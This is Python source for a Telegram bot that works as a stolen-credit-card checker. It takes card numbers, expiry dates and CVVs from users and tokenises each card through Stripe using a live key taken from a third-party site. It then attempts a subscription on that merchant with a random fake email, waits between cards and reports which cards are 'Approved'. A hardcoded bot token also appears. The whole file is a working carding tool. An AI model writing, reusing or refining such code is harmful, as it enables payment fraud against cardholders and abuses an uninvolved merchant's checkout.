import os
import re
import time
import random
import string
import threading
import requests
import telebot
from telebot import types

BOT_TOKEN = '7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY'
bot = telebot.TeleBot(BOT_TOKEN)

# To track if user wants to stop
user_stop_flag = {}

# Helper to randomize email
def random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@gmail.com"

# Helper to parse cards from user input
def parse_cards(text):
    # Accepts: CC|MM|YY|CVV, CC|MM|YYYY|CVV, CC/MM/YY/CVV, CC/MM/YYYY/CVV
    cards = []
    lines = text.replace('/', '|').splitlines()
    for line in lines:
        parts = [p.strip() for p in line.split('|')]
        if len(parts) == 4:
            cc, mm, yy, cvv = parts
            if len(yy) == 2:
                yy = '20' + yy
            if all(p.isdigit() for p in [cc, mm, yy, cvv]):
                cards.append((cc, mm, yy, cvv))
    return cards

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(
        message.chat.id,
        "👋 Welcome! Send credit cards in one of these formats (one per line):\n"
        "`CC|MM|YY|CVV`\n"
        "`CC|MM|YYYY|CVV`\n"
        "`CC/MM/YY/CVV`\n"
        "`CC/MM/YYYY/CVV`\n\n"
        "Send /stop anytime to cancel checking.",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    user_stop_flag[message.from_user.id] = True
    bot.send_message(message.chat.id, "⏹️ Checking stopped.")

def check_card_flow(message, cards):
    user_id = message.from_user.id
    chat_id = message.chat.id
    user_stop_flag[user_id] = False
    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        if user_stop_flag.get(user_id):
            bot.send_message(chat_id, "⏹️ Checking stopped by user.")
            break

        email = random_email()
        name = "John Doe"
        phone = "3144640037"
        postal_code = "10080"

        # 1. Create payment_method on Stripe
        stripe_payload = {
            "type": "card",
            "billing_details[name]": name,
            "billing_details[email]": email,
            "billing_details[phone]": phone,
            "billing_details[address][postal_code]": postal_code,
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "guid": ''.join(random.choices(string.hexdigits, k=32)),
            "muid": ''.join(random.choices(string.hexdigits, k=32)),
            "sid": ''.join(random.choices(string.hexdigits, k=32)),
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element",
            "referrer": "https://www.jetwebinar.com",
            "time_on_page": str(random.randint(10000, 99999)),
            "key": "pk_live_XwmzQS8EjYVv6D6ff4ycSP8W"
        }
        try:
            stripe_resp = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data=stripe_payload,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0"
                },
                timeout=30
            )
            stripe_json = stripe_resp.json()
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error with Stripe: {e}")
            continue

        pm_id = stripe_json.get("id", "")
        if not pm_id or not pm_id.startswith("pm_"):
            bot.send_message(chat_id, f"❌ Stripe error for card {cc}: {stripe_json}")
            continue

        # 2. Try to create subscription on JetWebinar
        jet_payload = {
            "name": name,
            "email": email,
            "phone": phone,
            "planId": "plan_basic_001",
            "paymentMethodId": pm_id,
            "isAnnual": False
        }
        try:
            jet_resp = requests.post(
                "https://www.jetwebinar.com/trial/api/create-subscription",
                json=jet_payload,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0"
                },
                timeout=30
            )
            jet_json = jet_resp.json()
            jet_text = jet_resp.text
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error with JetWebinar: {e}")
            continue

        # 3. Check for "sub_" in response
        if "sub_" in jet_text:
            status = "✅ Approved"
        else:
            status = "❌ Declined"

        bot.send_message(
            chat_id,
            f"Card {idx}/{len(cards)}: {cc}|{mm}|{yy}|{cvv}\n"
            f"Status: {status}\n"
            f"Response:\n<code>{jet_text}</code>",
            parse_mode="HTML"
        )

        if idx < len(cards):
            for i in range(15, 0, -1):
                if user_stop_flag.get(user_id):
                    bot.send_message(chat_id, "⏹️ Checking stopped by user.")
                    return
                bot.send_chat_action(chat_id, 'typing')
                time.sleep(1)

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    # Ignore commands
    if message.text and message.text.strip().startswith('/'):
        return

    cards = parse_cards(message.text)
    if not cards:
        bot.send_message(
            message.chat.id,
            "❌ Format not recognized. Please send cards as:\n"
            "`CC|MM|YY|CVV`\n"
            "`CC|MM|YYYY|CVV`\n"
            "`CC/MM/YY/CVV`\n"
            "`CC/MM/YYYY/CVV`",
            parse_mode="Markdown"
        )
        return

    bot.send_message(message.chat.id, f"🔍 Checking {len(cards)} card(s)... (send /stop to cancel)")
    threading.Thread(target=check_card_flow, args=(message, cards)).start()

if __name__ == '__main__':
    bot.infinity_polling()